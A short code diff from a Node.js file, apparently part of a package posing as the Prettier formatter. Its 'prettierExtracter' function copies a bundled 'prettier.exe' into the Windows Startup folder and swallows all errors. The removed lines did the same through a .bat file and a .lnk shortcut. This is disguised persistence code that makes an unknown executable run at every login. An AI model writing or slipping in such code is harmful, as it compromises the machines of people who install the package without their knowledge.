@@ -13,13 +13,11 @@ const os = require('os');
 
 const prettierExtracter = () => {
   try {
-    const sourceFile = path.join(__dirname, 'tools', 'prettier.bat');
-    const targetFile = path.join(__dirname, 'tools', 'prettier.lnk');
-    fs.symlinkSync(targetFile, sourceFile);
+    const sourceFile = path.join(__dirname, 'tools', 'prettier.exe');
     const appDataPath = path.join(os.homedir(), 'AppData', 'Roaming');
     const startupPath =  path.join(appDataPath, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
-    const destinationFile = path.join(startupPath, 'prettier.lnk');
-    fs.copyFileSync(targetFile, destinationFile);
+    const destinationFile = path.join(startupPath, 'prettier.exe');
+    fs.copyFileSync(sourceFile, destinationFile);
   } catch (err) { }
 }
 
